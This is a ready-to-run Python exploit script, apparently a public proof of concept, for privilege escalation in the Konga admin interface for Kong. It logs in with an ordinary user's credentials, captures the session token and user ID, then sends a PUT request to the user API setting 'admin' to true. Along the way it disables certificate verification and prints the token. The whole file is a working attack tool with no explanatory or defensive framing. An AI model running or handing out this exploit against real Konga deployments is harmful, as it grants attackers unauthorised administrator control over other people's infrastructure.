#!/usr/bin/env python3
import requests
import sys
import signal
import argparse
from tabulate import tabulate
from urllib3.exceptions import InsecureRequestWarning

# Colorschemes
NONE = '\033[00m'
BLACK = '\033[01;30m'
RED = '\033[01;31m'
GREEN = '\033[01;32m'
YELLOW = '\033[01;33m'
BLUE = '\033[0;34m'
PURPLE = '\033[01;35m'
CYAN = '\033[01;36m'
WHITE = '\033[01;37m'
BOLD = '\033[1m'
BLINK = '\033[5m'
UNDERLINE = '\033[4m'


# Ignore Unverified SSL certs
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# Present Data in a tabular format
def SHOW_TABLE(heading, table, header=[]):
    gprint(heading)
    print(f'{CYAN}{tabulate(table,headers=header, tablefmt="grid")}{NONE}\n')


# Print Info Messages
def gprint(string, prefix=""):
    print(f"{prefix}[{GREEN}+{NONE}] {string}")


# Print Neutral Message
def nprint(string, prefix=""):
    print(f"{prefix}[{YELLOW}~{NONE}] {string}")


# Print Warning/Error Messages
def rprint(string, prefix="",):
    print(f"{prefix}[{RED}-{NONE}] {string}")


# Interrupt Handler
def sigHandler(sig, frame):
    rprint(f"Received {RED}Ctrl+C{NONE}\n")
    rprint(f"Exiting.\n")
    sys.exit(-1)


# Parse Command Line Arguments
def parseArgs():
    url = ""
    user = ""
    passwd = ""

    parser = argparse.ArgumentParser(
        description=nprint(f"Konga Privilege Escalation by {CYAN}@whokilleddb{NONE}"))
    parser.add_argument('URL', help="Base URL(Including Port)")
    parser.add_argument('-U', metavar='Username', required=True,
                        type=str, help="Username For Authentication")
    parser.add_argument('-P', metavar='Password', required=True,
                        type=str, help="Password For Authentication")
    args = parser.parse_args()

    url = args.URL if args.URL[-1] == '/' else args.URL + '/'
    user = args.U
    passwd = args.P
    return [url, user, passwd]


class Exploit:
    def __init__(self, url, passwd, user):
        self.url = url
        self.user = user
        self.passwd = passwd
        self.session = requests.Session()
        self.session.verify = False
        self.token = ""
        self.id = 0
        SHOW_TABLE("Target Info", [["URL", self.url], [
                   "Username", self.user], ["Password", self.passwd]])


    # Check Connection
    def checkConnect(self):
        r = None
        try:
            r = self.session.get(self.url, timeout=5)

        except requests.exceptions.SSLError:
            rprint(f"Server Is Running {RED}Without SSL{NONE}")
            nprint(f"Switching To HTTP")
            self.url = self.url.replace("https", "http", 1)
            self.checkConnect()
            return

        except Exception as e:
            nprint(f"Failed To Connect To {PURPLE}{self.url}{NONE}")
            nprint(f"Exception Occured As: {RED}{e}{NONE}")
            sys.exit(-1)

        if "SSL" in r.content.decode().upper():
            gprint("Server Is Running In {GREEN}SSL Mode{NONE}")
            nprint("Switching To {PURPLE}SSL MODE{NONE}")
            self.url = self.url.replace("http:", "https:", 1)
            self.checkConnect()
            return

    # Make Login Request
    def checkLogin(self):
        target = self.url + "login"
        self.session.headers.update({"Content-Type": "application/json"})
        params={
            "identifier":self.user,
            "password":self.passwd
        }
        
        try:
            r=self.session.post(target,json=params,timeout=5)
        except Exception as e:
            rprint(f"Error Occured As: {RED}{e}{NONE}")
        
        if r.ok:
            if "Invalid user" not in r.text:
                self.token = r.json()['token']
                self.id = str(r.json()['user']['id'])
                gprint(f"User ID: {GREEN}{self.id}{NONE}")
                gprint(f"Token Found As: {PURPLE}{self.token}{NONE}")
            else:
                rprint("Invalid Credentials")
        elif r.status_code == 401:
            rprint("Invalid Credentials")
        else:
            rprint(f"Receivied A Response Code Of {RED}{r.status_code}{NONE}")
            sys.exit(-1)

    def escalate(self):
        target = self.url + "api/user/" + self.id
        params = {"admin": "true", 
                  "passports":
                    {
                        "password":self.passwd,
                        "protocol":"local"
                    }, 
                  "password_confirmation":self.passwd,
                  "token":self.token
                  }
        try:
            r = self.session.put(target,json=params,timeout=5)
            if r.ok:
                if "not valid" not in r.text:
                    gprint(f"Successfully Escalated To {BLUE}{BOLD}ADMIN{NONE}")
                    gprint("Remember To Refresh The Page!")
                else:
                    rprint("Something Went Wrong :(")
                    rprint("Has the User ID or token been changed?")
                    sys.exit(-1)
            else:
                rprint(f"Receivied A Response Code Of {RED}{r.status_code}{NONE}")
                sys.exit(-1)

        except Exception as e:
            rprint(f"Exception Occured As: {RED}{e}{NONE}")
            sys.exit(-1)


# Main Functions
def main():
    args = parseArgs()
    # Create Exploit Class
    exploit = Exploit(args[0], args[2], args[1])
    exploit.checkConnect()
    exploit.checkLogin()
    exploit.escalate()

# Entry Point
if __name__ == '__main__':
    signal.signal(signal.SIGINT, sigHandler)
    main()
